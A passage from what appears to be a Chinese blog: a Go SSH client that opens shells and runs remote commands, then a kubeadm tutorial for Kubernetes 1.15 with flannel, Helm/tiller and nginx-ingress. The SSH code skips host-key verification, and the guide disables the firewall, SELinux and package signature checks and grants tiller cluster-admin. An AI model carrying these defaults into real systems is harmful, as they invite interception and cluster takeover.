\u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;time\u0026#34; ) type Conn struct { user string path string auth []ssh.AuthMethod addr string } var ( client *ssh.Client session *ssh.Session password string host string path string port int user string help bool ) func usage() { _, _ = fmt.Fprintf(os.Stderr, `sshgo version:1.0.0 Usage sshgo [-h host] [-P port] [-u user] [--pkPath path] [-p password] example: 1) sshgo -u root -P 9527 -h 1.1.1.1 --pkPath /path/to/id_rsa -p 123456 2) sshgo --user root --port 9527 --host 1.1.1.1 --pkPath /path/to/id_rsa --password 123456 if use key to login, the password is the key password; if use user \u0026amp; pasword; the password is for user. Options: `) flag.PrintDefaults() } func init() { flag.StringVarP(\u0026amp;password, \u0026#34;password\u0026#34;, \u0026#34;p\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34; + \u0026#34;if use key to login, the password is the key password; \u0026#34; + \u0026#34;if use user \u0026amp; password to login; the password is for user.\u0026#34;) flag.StringVarP(\u0026amp;path, \u0026#34;pkPath\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;private key path\u0026#34;) flag.StringVarP(\u0026amp;host, \u0026#34;host\u0026#34;, \u0026#34;h\u0026#34;, \u0026#34;fenghong.tech\u0026#34;, \u0026#34;remote host addr ip\u0026#34;) flag.IntVarP(\u0026amp;port, \u0026#34;port\u0026#34;, \u0026#34;P\u0026#34;, 9527, \u0026#34;remote host port\u0026#34;) flag.StringVarP(\u0026amp;user, \u0026#34;user\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;remote host user\u0026#34;) flag.BoolVarP(\u0026amp;help, \u0026#34;help\u0026#34;, \u0026#34;\u0026#34;, false, \u0026#34;this help\u0026#34;) flag.Usage = usage } func (c *Conn) SetConf() (err error) { c.addr = fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, host, port) c.user = user c.path = path c.auth = make([]ssh.AuthMethod, 0) var method ssh.AuthMethod // use privatakey to login,defualt is \u0026#34;\u0026#34; \tif path != \u0026#34;\u0026#34; { c.auth = make([]ssh.AuthMethod, 0) method, err = PublicFile(path, password) if err != nil { return err } // use password \u0026amp; user to login \t} else { method = ssh.Password(password) } c.auth = append(c.auth, method) return nil } func (c *Conn) SetSession() (session *ssh.Session, err error) { client, err = ssh.Dial(\u0026#34;tcp\u0026#34;, c.addr, \u0026amp;ssh.ClientConfig{ User: c.user, Auth: c.auth, //需要验证服务端，不做验证返回nil就可以，点击HostKeyCallback看源码就知道了 \tHostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error { return nil }, Timeout: time.Second * 2, }) if err != nil { fmt.Println(err) return nil, err } // create session \tif session, err = client.NewSession(); err != nil { return nil, err } return session, nil } func isFile(path string) bool { _, err := os.Stat(path) return err == nil || os.IsExist(err) } //采用公钥验证,这里封装了一下,使用秘钥+密码验证 func PublicFile(privateKeyPath, password string) (method ssh.AuthMethod, err error) { if !isFile(privateKeyPath) { return nil, errors.New(\u0026#34;file not exist\u0026#34;) } bufKey, err := ioutil.ReadFile(privateKeyPath) if err != nil { return nil, err } var key ssh.Signer if password == \u0026#34;\u0026#34; { key, err = ssh.ParsePrivateKey(bufKey) if err != nil { return nil, err } } else { bufPwd := []byte(password) key, err = ssh.ParsePrivateKeyWithPassphrase(bufKey, bufPwd) if err != nil { return nil, err } } return ssh.PublicKeys(key), nil } func main() { flag.Parse() if help { flag.Usage() return } c := Conn{} err := c.SetConf() if err != nil { log.Fatalln(err) } session, err = c.SetSession() if err != nil { log.Fatalln(err) } defer session.Close() //当ssh连接建立过后, 我们就可以通过这个连接建立一个回话, 在回话上和远程主机通信。 \tsession.Stdout = os.Stdout session.Stderr = os.Stderr session.Stdin = os.Stdin modes := ssh.TerminalModes{ ssh.ECHO:1, ssh.ECHOCTL:0, ssh.TTY_OP_ISPEED:14400, ssh.TTY_OP_OSPEED:14400, } termFd := int(os.Stdin.Fd()) w,h,_ := terminal.GetSize(termFd) termState, _ := terminal.MakeRaw(termFd) // TODO 主动从服务器exit,会导致空指针. \tdefer terminal.Restore(termFd,termState) err = session.RequestPty(\u0026#34;xterm-256color\u0026#34;,h,w,modes) if err != nil { log.Fatalln(err) } err = session.Shell() if err != nil { log.Fatalln(err) } err = session.Wait() if err != nil { log.Fatalln(err) } }  实现交互命令  远程执行命令和交互命令认证过程都一样,唯一区别的是会话\nvar cmd string // init 函数加上命令行参数 flag.StringVarP(\u0026amp;cmd, \u0026#34;cmd\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;pwd\u0026#34;, \u0026#34;execute cmd in server\u0026#34;) func main() { flag.Parse() if help { flag.Usage() return } c := Conn{} err := c.SetConf() if err != nil { log.Fatalln(err) } session, err = c.SetSession() if err != nil { log.Fatalln(err) } defer session.Close() session.Stdout = os.Stdout session.Stderr = os.Stderr _ = session.Run(cmd) } 验证 ### 交互命令式验证 $ go build sshTunel.go $ ./sshTunel.exe Last login: Mon Sep 2 00:43:39 2019 from 183.192.10.3 Welcome to Alibaba Cloud Elastic Compute Service ! Welcome to the testing environment of Louis. Feel free to use this system for testing your Linux skills. In case of any issues reach out to admin at louisehong4168@gmail.com. Thank you. [oh-my-zsh] Random theme '/root/.oh-my-zsh/themes/gnzh.zsh-theme' loaded... ╭─root@master-louis ~ system: ruby 2.0.0p648 ╰─➤ ## 执行命令式 \u0026gt; go run ssh.go -a \u0026quot;d:/text/id_rsa\u0026quot; -c pwd /root \u0026gt; go run ssh.go -u feng -w password -c pwd /home/feng 初步实现ssh客户端功能\n","permalink":"https://www.fenghong.tech/blog/go/go-ssh/","tags":["go","ssh"],"title":"go ssh实现"},{"categories":["kubernetes"],"contents":"[TOC]\nkubeadm是Kubernetes官方提供的用于快速安装Kubernetes集群的工具，伴随Kubernetes每个版本的发布都会同步更新，kubeadm会对集群配置方面的一些实践做调整，通过实验kubeadm可以学习到Kubernetes官方在集群配置上一些新的最佳实践。\n环境准备 主机名 设置永久主机名称，然后重新登录:\nhostnamectl set-hostname master # 将 master 替换为当前主机名  设置的主机名保存在 /etc/hostname 文件中；  如果 DNS 不支持解析主机名称，则需要修改每台机器的 /etc/hosts 文件，添加主机名和 IP 的对应关系：\ncat \u0026gt;\u0026gt; /etc/hosts \u0026lt;\u0026lt;EOF 192.168.18.10 master 192.168.18.11 node01 192.168.18.12 node02 EOF 关闭防火墙 在每台机器上关闭防火墙，清理防火墙规则，设置默认转发策略：\nsystemctl stop firewalld systemctl disable firewalld iptables -F \u0026amp;\u0026amp; iptables -X \u0026amp;\u0026amp; iptables -F -t nat \u0026amp;\u0026amp; iptables -X -t nat iptables -P FORWARD ACCEPT 关闭 swap 分区 如果开启了 swap 分区，kubelet 会启动失败(可以通过将参数 \u0026ndash;fail-swap-on 设置为 false 来忽略 swap on)，故需要在每台机器上关闭 swap 分区。同时注释 /etc/fstab 中相应的条目，防止开机自动挂载 swap 分区：\nswapoff -a sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab 关闭 SELinux 关闭 SELinux，否则后续 K8S 挂载目录时可能报错 Permission denied：\nsetenforce 0 sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config 加载内核模块 cat \u0026gt; /etc/sysconfig/modules/ipvs.modules \u0026lt;\u0026lt;EOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack_ipv4 EOF chmod 755 /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; bash /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4 上面脚本创建了的/etc/sysconfig/modules/ipvs.modules文件，保证在节点重启后能自动加载所需模块。 使用lsmod | grep -e ip_vs -e nf_conntrack_ipv4命令查看是否已经正确加载所需的内核模块。\n接下来还需要确保各个节点上已经安装了ipset软件包yum install ipset。 为了便于查看ipvs的代理规则，最好安装一下管理工具ipvsadm yum install ipvsadm。\n优化内核参数 $ cat \u0026gt; kubernetes.conf \u0026lt;\u0026lt;EOF net.bridge.bridge-nf-call-iptables=1 net.bridge.bridge-nf-call-ip6tables=1 net.ipv4.ip_forward=1 net.ipv4.tcp_tw_recycle=0 vm.swappiness=0 # 禁止使用 swap 空间，只有当系统 OOM 时才允许使用它 vm.overcommit_memory=1 # 不检查物理内存是否够用 vm.panic_on_oom=0 # 开启 OOM fs.inotify.max_user_instances=8192 fs.inotify.max_user_watches=1048576 fs.file-max=52706963 fs.nr_open=52706963 net.ipv6.conf.all.disable_ipv6=1 net.netfilter.nf_conntrack_max=2310720 EOF $ cp kubernetes.conf /etc/sysctl.d/kubernetes.conf $ sysctl -p /etc/sysctl.d/kubernetes.conf 安装Docker Kubernetes从1.6开始使用CRI(Container Runtime Interface)容器运行时接口。默认的容器运行时仍然是Docker，使用的是kubelet中内置dockershim CRI实现。\n$ yum install -y yum-utils \\  device-mapper-persistent-data \\  lvm2 $ yum install docker-ce docker-ce-cli containerd.io Loaded plugins: fastestmirror, product-id, search-disabled-repos, subscription-manager This system is not registered with an entitlement server. You can use subscription-manager to register. Loading mirror speeds from cached hostfile * epel: epel.dionipe.id * rpmfusion-free-updates: fr2.rpmfind.net * rpmfusion-nonfree-updates: fr2.rpmfind.net * webtatic: uk.repo.webtatic.com Resolving Dependencies --\u0026gt; Running transaction check ---\u0026gt; Package docker-ce.x86_64 3:18.09.3-3.el7 will be installed --\u0026gt; Processing Dependency: container-selinux \u0026gt;= 2.9 for package: 3:docker-ce-18.09.3-3.el7.x86_64 --\u0026gt; Processing Dependency: containerd.io \u0026gt;= 1.2.2-3 for package: 3:docker-ce-18.09.3-3.el7.x86_64 --\u0026gt; Processing Dependency: docker-ce-cli for package: 3:docker-ce-18.09.3-3.el7.x86_64 --\u0026gt; Processing Dependency: libcgroup for package: 3:docker-ce-18.09.3-3.el7.x86_64 --\u0026gt; Running transaction check ---\u0026gt; Package containerd.io.x86_64 0:1.2.4-3.1.el7 will be installed ---\u0026gt; Package docker-ce.x86_64 3:18.09.3-3.el7 will be installed --\u0026gt; Processing Dependency: container-selinux \u0026gt;= 2.9 for package: 3:docker-ce-18.09.3-3.el7.x86_64 ---\u0026gt; Package docker-ce-cli.x86_64 1:18.09.3-3.el7 will be installed ---\u0026gt; Package libcgroup.x86_64 0:0.41-20.el7 will be installed --\u0026gt; Finished Dependency Resolution Error: Package: 3:docker-ce-18.09.3-3.el7.x86_64 (docker-ce-stable) Requires: container-selinux \u0026gt;= 2.9 You could try using --skip-broken to work around the problem You could try running: rpm -Va --nofiles --nodigest centos默认yum安装docker会报错container-selinux \u0026gt;= 2.9,建存储库以指向CentOS repo。在其中创建一个文件/etc/yum.repos.d并为其命名，centos.repo并添加以下存储库资源。\ncat \u0026gt; /etc/yum.repo.d/centos.repo \u0026lt;\u0026lt;EOF # Create new repo to enable CentOS [centos] name=CentOS-7 baseurl=http://ftp.heanet.ie/pub/centos/7/os/x86_64/ enabled=1 gpgcheck=1 gpgkey=http://ftp.heanet.ie/pub/centos/7/os/x86_64/RPM-GPG-KEY-CentOS-7 EOF 然后，container-selinux从CentOS镜像站点安装。将版本更改为此站点中列出的最新版本。\n$ yum update $ yum install -y http://mirror.centos.org/centos/7/extras/x86_64/Packages/container-selinux-2.74-1.el7.noarch.rpm $ systemctl enable docker $ systemctl start docker 修改docker cgroup driver为systemd 根据文档CRI installation中的内容，对于使用systemd作为init system的Linux的发行版，使用systemd作为docker的cgroup driver可以确保服务器节点在资源紧张的情况更加稳定，因此这里修改各个节点上docker的cgroup driver为systemd。\n{ \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;] } 创建或修改/etc/docker/daemon.json：重启docker：\n$ systemctl restart docker google的k8s镜像下载 google镜像问题，需要科学上网才能解决，这里提供代理解决方案\n$ cat \u0026lt;\u0026lt;EOF \u0026gt; azk8s.sh #!/bin/bash #!/bin/bash ## k8s关键镜像 ## docker pull gcr.azk8s.cn/google_containers/coredns:1.3.1 docker pull gcr.azk8s.cn/google_containers/etcd:3.3.10 docker pull gcr.azk8s.cn/google_containers/kube-scheduler:v1.15.3 docker pull gcr.azk8s.cn/google_containers/kube-controller-manager:v1.15.3 docker pull gcr.azk8s.cn/google_containers/kube-apiserver:v1.15.3 docker pull gcr.azk8s.cn/google_containers/kube-proxy:v1.15.3 docker pull gcr.azk8s.cn/google_containers/pause:3.1 ## helm和tiller和dashboard镜像 ## docker pull gcr.azk8s.cn/kubernetes-helm/tiller:v2.14.3 docker pull gcr.azk8s.cn/google_containers/kubernetes-dashboard-amd64:v1.10.1 ## ingress-backend ## docker pull gcr.azk8s.cn/google_containers/defaultbackend-amd64:1.5 docker tag gcr.azk8s.cn/google_containers/defaultbackend-amd64:1.5 k8s.gcr.io/defaultbackend-amd64:1.5 ## metrics-server ## docker pull gcr.azk8s.cn/google_containers/metrics-server-amd64:v0.3.4 docker tag gcr.azk8s.cn/google_containers/metrics-server-amd64:v0.3.4 gcr.io/google_containers/metrics-server-amd64:v0.3.4 ## 重新tag 镜像 ## docker tag gcr.azk8s.cn/google_containers/coredns:1.3.1 k8s.gcr.io/coredns:1.3.1 docker tag gcr.azk8s.cn/google_containers/etcd:3.3.10 k8s.gcr.io/etcd:3.3.10 docker tag gcr.azk8s.cn/google_containers/pause:3.1 k8s.gcr.io/pause:3.1 docker tag gcr.azk8s.cn/google_containers/kube-proxy:v1.15.3 k8s.gcr.io/kube-proxy:v1.15.3 docker tag gcr.azk8s.cn/google_containers/kube-scheduler:v1.15.3 k8s.gcr.io/kube-scheduler:v1.15.3 docker tag gcr.azk8s.cn/google_containers/kube-controller-manager:v1.15.3 k8s.gcr.io/kube-controller-manager:v1.15.3 docker tag gcr.azk8s.cn/google_containers/kube-apiserver:v1.15.3 k8s.gcr.io/kube-apiserver:v1.15.3 docker tag gcr.azk8s.cn/kubernetes-helm/tiller:v2.14.3 gcr.io/kubernetes-helm/tiller:v2.14.3 docker tag gcr.azk8s.cn/google_containers/kubernetes-dashboard-amd64:v1.10.1 k8s.gcr.io/kubernetes-dashboard-amd64:v1.10.1 ## delete azk8s related images docker rmi $(docker images |grep azk8s | grep -v REPOSITORY | awk \u0026#39;BEGIN{OFS=\u0026#34;:\u0026#34;;ORS=\u0026#34; \u0026#34;}{print $1,$2}\u0026#39;) EOF $ bash -x azk8s.sh ### 据说kubeadm --image-repository 可以直接更改镜像仓库，这样就不用担心被墙了。可以试一下 使用kubeadm部署Kubernetes 下面在各节点安装kubeadm和kubelet：\n$ cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 EOF yum安装kubeadm：\n$ yum makecache fast $ yum install -y kubelet kubeadm kubectl 因为这里本次用于测试三台主机上还运行其他服务，关闭swap可能会对其他服务产生影响，所以这里修改kubelet的配置去掉这个限制。 使用kubelet的启动参数--fail-swap-on=false去掉必须关闭Swap的限制，修改/etc/sysconfig/kubelet，加入：\nKUBELET_EXTRA_ARGS=--fail-swap-on=false 在各节点开机启动kubelet服务：\n$ systemctl enable kubelet.service 在master节点初始化集群：\n$ kubeadm init \\  --kubernetes-version=v1.15.3 \\  --pod-network-cidr=10.244.0.0/16 \\  --apiserver-advertise-address=192.168.18.10 \\  --ignore-preflight-errors=Swap 坑1: --pod-network-cidr=10.244.0.0/16,更换为其他子网比如192.168.0.0/16会在日志里疯狂报错,从节点的cni无法启动,flannel无法启动,一直处理NotReady状态 坑2: master和node节点的存储不能超过85%,k8s系统默认超过85%会自动Gc,清除镜像. 不加--ignore-preflight-errors=Swap，kubeadm也会报错 [init] Using Kubernetes version: v1.14.0 [preflight] Running pre-flight checks [WARNING Swap]: running with swap on is not supported. Please disable swap [preflight] Pulling images required for setting up a Kubernetes cluster [preflight] This might take a minute or two, depending on the speed of your internet connection [preflight] You can also perform this action in beforehand using \u0026#39;kubeadm config images pull\u0026#39; [kubelet-start] Writing kubelet environment file with flags to file \u0026#34;/var/lib/kubelet/kubeadm-flags.env\u0026#34; [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; [kubelet-start] Activating the kubelet service [certs] Using certificateDir folder \u0026#34;/etc/kubernetes/pki\u0026#34; [certs] Generating \u0026#34;ca\u0026#34; certificate and key [certs] Generating \u0026#34;apiserver\u0026#34; certificate and key [certs] apiserver serving cert is signed for DNS names [node1 kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local] and IPs [10.96.0.1 192.168.61.11] [certs] Generating \u0026#34;apiserver-kubelet-client\u0026#34; certificate and key [certs] Generating \u0026#34;front-proxy-ca\u0026#34; certificate and key [certs] Generating \u0026#34;front-proxy-client\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/ca\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/peer\u0026#34; certificate and key [certs] etcd/peer serving cert is signed for DNS names [node1 localhost] and IPs [192.168.18.10 127.0.0.1 ::1] [certs] Generating \u0026#34;etcd/healthcheck-client\u0026#34; certificate and key [certs] Generating \u0026#34;apiserver-etcd-client\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/server\u0026#34; certificate and key [certs] etcd/server serving cert is signed for DNS names [node1 localhost] and IPs [192.168.18.10 127.0.0.1 ::1] [certs] Generating \u0026#34;sa\u0026#34; key and public key [kubeconfig] Using kubeconfig folder \u0026#34;/etc/kubernetes\u0026#34; [kubeconfig] Writing \u0026#34;admin.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;kubelet.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;controller-manager.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;scheduler.conf\u0026#34; kubeconfig file [control-plane] Using manifest folder \u0026#34;/etc/kubernetes/manifests\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-apiserver\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-controller-manager\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-scheduler\u0026#34; [etcd] Creating static Pod manifest for local etcd in \u0026#34;/etc/kubernetes/manifests\u0026#34; [wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory \u0026#34;/etc/kubernetes/manifests\u0026#34;. This can take up to 4m0s [apiclient] All control plane components are healthy after 18.503026 seconds [upload-config] storing the configuration used in ConfigMap \u0026#34;kubeadm-config\u0026#34; in the \u0026#34;kube-system\u0026#34; Namespace [kubelet] Creating a ConfigMap \u0026#34;kubelet-config-1.14\u0026#34; in namespace kube-system with the configuration for the kubelets in the cluster [upload-certs] Skipping phase. Please see --experimental-upload-certs [mark-control-plane] Marking the node node1 as control-plane by adding the label \u0026#34;node-role.kubernetes.io/master=\u0026#39;\u0026#39;\u0026#34; [mark-control-plane] Marking the node node1 as control-plane by adding the taints [node-role.kubernetes.io/master:NoSchedule] [bootstrap-token] Using token: m23ls0.23n2edf9i5w37ik6 [bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials [bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token [bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster [bootstrap-token] creating the \u0026#34;cluster-info\u0026#34; ConfigMap in the \u0026#34;kube-public\u0026#34; namespace [addons] Applied essential addon: CoreDNS [addons] Applied essential addon: kube-proxy Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 192.168.18.10:6443 --token rlylpe.lwh24h3j33usmi7s --discovery-token-ca-cert-hash sha256:3209293d8057e442d18f9586d4e2e92e759a33b2b918f09916dd674357c74a6c 其中有以下关键内容：\n [kubelet-start] 生成kubelet的配置文件”/var/lib/kubelet/config.yaml” [certificates]生成相关的各种证书 [kubeconfig]生成相关的kubeconfig文件 [bootstraptoken]生成token记录下来，后边使用kubeadm join往集群中添加节点时会用到.  执行提示命令：\n$ mkdir -p $HOME/.kube $ cp -i /etc/kubernetes/admin.conf $HOME/.kube/config $ chown $(id -u):$(id -g) $HOME/.kube/config 查看一下集群状态，确认个组件都处于healthy状态：\n$ kubectl get cs NAME STATUS MESSAGE ERROR controller-manager Healthy ok scheduler Healthy ok etcd-0 Healthy {\u0026#34;health\u0026#34;: \u0026#34;true\u0026#34;} 集群初始化如果遇到问题，可以使用下面的命令进行清理：\n$ kubeadm reset $ ifconfig cni0 down $ ip link delete cni0 $ ifconfig flannel.1 down $ ip link delete flannel.1 $ rm -rf /var/lib/cni/ 安装pod网络 $ wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml $ kubectl apply -f kube-flannel.yml ## 查看安装的网络状态 ## $ kubectl get pod --all-namespaces -o wide NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES kube-system coredns-5c98db65d4-fsfzk 1/1 Running 0 20m 10.244.0.2 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system coredns-5c98db65d4-r9ckz 1/1 Running 0 20m 10.244.0.3 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system etcd-master 1/1 Running 0 19m 192.168.18.10 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-apiserver-master 1/1 Running 0 19m 192.168.18.10 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-flannel-ds-amd64-nlw98 1/1 Running 0 15m 192.168.18.10 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-controller-manager-master 1/1 Running 0 19m 192.168.18.10 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 5h18m 192.168.18.10 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-886c8 1/1 Running 0 19m 192.168.18.10 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-scheduler-master 1/1 Running 0 19m 192.168.18.10 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 测试DNS:\n$ kubectl run curl --image=radial/busyboxplus:curl -it kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead. If you don\u0026#39;t see a command prompt, try pressing enter. [ root@curl-6bf6db5c4f-m5qws:/ ]$ nslookup kubernetes.default Server: 10.96.0.10 Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.local Name: kubernetes.default Address 1: 10.96.0.1 kubernetes.default.svc.cluster.local 从节点加入kubernets集群 node01和node02的这几个镜像必须有，可以按照前面的脚本来下载：\npause:3.1 kube-proxy:v1.15.3 kubernetes-dashboard-amd64:v1.10.1 metrics-server-amd64:v0.3.4 从节点运行kubeadm join来加入集群：\n$ kubeadm join 192.168.18.10:6443 --token rlylpe.lwh24h3j33usmi7s --discovery-token-ca-cert-hash sha256:3209293d8057e442d18f9586d4e2e92e759a33b2b918f09916dd674357c74a6c --ignore-preflight-errors=Swap 如果忘记了这个命令，或者是新加入的节点该怎么办？在master节点执行这个命令即可:\n$ kubeadm token create --print-join-command 运行命令后，在master上查看集群节点状态：\n$ kubectl get node NAME STATUS ROLES AGE VERSION master Ready master 48m v1.15.3 node01 Ready \u0026lt;none\u0026gt; 20m v1.15.3 node02 Ready \u0026lt;none\u0026gt; 20m v1.15.3 如果需要从集群中移除node02这个Node执行下面的命令：\n$ kubectl drain node02 --delete-local-data --force --ignore-daemonsets $ kubectl delete node node02 kube-proxy 开启ipvs：\n$ kubectl edit cm kube-proxy -n kube-system /mode ##定位至mode关键字 mode: \u0026#34;ipvs\u0026#34; :wq! ## 需要强制写入并退出 重启kube-proxy服务：\n$ kubectl get pod -n kube-system | grep kube-proxy | awk \u0026#39;{system(\u0026#34;kubectl delete pod \u0026#34;$1\u0026#34; -n kube-system\u0026#34;)}\u0026#39; 验证:\n$ kubectl get pod -n kube-system | grep kube-proxy kube-proxy-886c8 1/1 Running 0 4h7m kube-proxy-fxb2t 1/1 Running 0 4h7m kube-proxy-km2s4 1/1 Running 0 4h7m $ kubectl logs -n kube-system kube-proxy-886c8 I0627 05:51:01.150550 1 server_others.go:170] Using ipvs Proxier. W0627 05:51:01.151040 1 proxier.go:401] IPVS scheduler not specified, use rr by default I0627 05:51:01.151312 1 server.go:534] Version: v1.15.3 I0627 05:51:01.169641 1 conntrack.go:52] Setting nf_conntrack_max to 131072 I0627 05:51:01.170109 1 config.go:187] Starting service config controller I0627 05:51:01.170145 1 controller_utils.go:1029] Waiting for caches to sync for service config controller I0627 05:51:01.170312 1 config.go:96] Starting endpoints config controller I0627 05:51:01.170338 1 controller_utils.go:1029] Waiting for caches to sync for endpoints config controller I0627 05:51:01.270656 1 controller_utils.go:1036] Caches are synced for service config controller I0627 05:51:01.270679 1 controller_utils.go:1036] Caches are synced for endpoints config controller helm安装 Helm由客户端命helm令行工具和服务端tiller组成，Helm的安装十分简单。 下载helm命令行工具到master节点的/usr/bin下:\n$ wget https://storage.googleapis.com/kubernetes-helm/helm-v2.14.1-linux-amd64.tar.gz $ tar xf helm-v2.14.1-linux-amd64.tar.gz $ cp linux-amd64/helm /usr/bin 因为Kubernetes APIServer开启了RBAC访问控制，所以需要创建tiller使用的service account: tiller并分配合适的角色给它。 详细内容可以查看helm文档中的Role-based Access Control。 这里简单起见直接分配cluster-admin这个集群内置的ClusterRole给它。创建rbac-config.yaml文件\n$ cat \u0026gt;\u0026gt; EOF \u0026lt; rbac-config.yaml apiVersion: v1 kind: ServiceAccount metadata: name: tiller namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1beta1 kind: ClusterRoleBinding metadata: name: tiller roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin subjects: - kind: ServiceAccount name: tiller namespace: kube-system EOF $ kubectl create -f rbac-config.yaml $ helm init --upgrade -i gcr.io/kubernetes-helm/tiller:v2.14.1 $ helm repo remove stable $ helm repo add stable https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts tiller默认被部署在k8s集群中的kube-system这个namespace下：\n$ kubectl get pod -n kube-system -l app=helm NAME READY STATUS RESTARTS AGE tiller-deploy-7bf78cdbf7-jhmdk 1/1 Running 0 16m 查看helm的version：\n$ helm version Client: \u0026amp;version.Version{SemVer:\u0026#34;v2.14.1\u0026#34;, GitCommit:\u0026#34;5270352a09c7e8b6e8c9593002a73535276507c0\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;} Server: \u0026amp;version.Version{SemVer:\u0026#34;v2.14.1\u0026#34;, GitCommit:\u0026#34;5270352a09c7e8b6e8c9593002a73535276507c0\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;} 创建了tiller的 ServceAccount 后还没完，因为我们的 Tiller 之前已经就部署成功了，而且是没有指定 ServiceAccount 的，所以我们需要给 Tiller 打上一个ServiceAccount的补丁,如果不打补丁,会导致后面的forbidden报错：\n$ kubectl --namespace kube-system create serviceaccount tiller $ kubectl create clusterrolebinding tiller-cluster-rule \\ --clusterrole=cluster-admin --serviceaccount=kube-system:tiller $ kubectl --namespace kube-system patch deploy tiller-deploy \\ -p '{\u0026quot;spec\u0026quot;:{\u0026quot;template\u0026quot;:{\u0026quot;spec\u0026quot;:{\u0026quot;serviceAccount\u0026quot;:\u0026quot;tiller\u0026quot;}}}}' 更换helm镜像源 helm repo add stable http://mirror.azure.cn/kubernetes/charts \u0026#34;stable\u0026#34; has been added to your repositories # helm repo list NAME URL local http://127.0.0.1:8879/charts stable\thttps://mirror.azure.cn/kubernetes/charts/ 安装ingress 将master节点做为边缘节点,打上edge\nkubectl label node master node-role.kubernetes.io/edge= node/master labeled $ kgn (alias for `kubectl get nodes`) NAME STATUS ROLES AGE VERSION master Ready edge,master 13h v1.15.3 node01 Ready \u0026lt;none\u0026gt; 13h v1.15.3 stable/nginx-ingress的chart的value.yaml如下:\ncat \u0026gt; nginx-ingress.yaml \u0026lt;\u0026lt; EOF controller: replicaCount: 1 hostNetwork: true nodeSelector: node-role.kubernetes.io/edge: \u0026#39;\u0026#39; affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - nginx-ingress - key: component operator: In values: - controller topologyKey: kubernetes.io/hostname tolerations: - key: node-role.kubernetes.io/master operator: Exists effect: NoSchedule - key: node-role.kubernetes.io/master operator: Exists effect: PreferNoSchedule defaultBackend: nodeSelector: node-role.kubernetes.io/edge: \u0026#39;\u0026#39; tolerations: - key: node-role.kubernetes.io/master operator: Exists effect: NoSchedule - key: node-role.kubernetes.io/master operator: Exists effect: PreferNoSchedule EOF 部署nginx-ingress,镜像已经提前下载完毕\nhelm install stable/nginx-ingress -n nginx-ingress -f nginx-ingress.yml 验证: 出现default backend,说明部署成功.\n$ curl http://master-ip #直接访问master的80端口,进行验证 default backend - 404 安装dashboard 实现能直接域名访问dashboard,且带有ssl的相关证书,免费ssl证书生成可以查看use acme.sh to renew ssl cert. 得到fenghhong.key fenghong.cer证书之后.\n# kubectl -n kube-system create secret tls qx-tls-secret --key 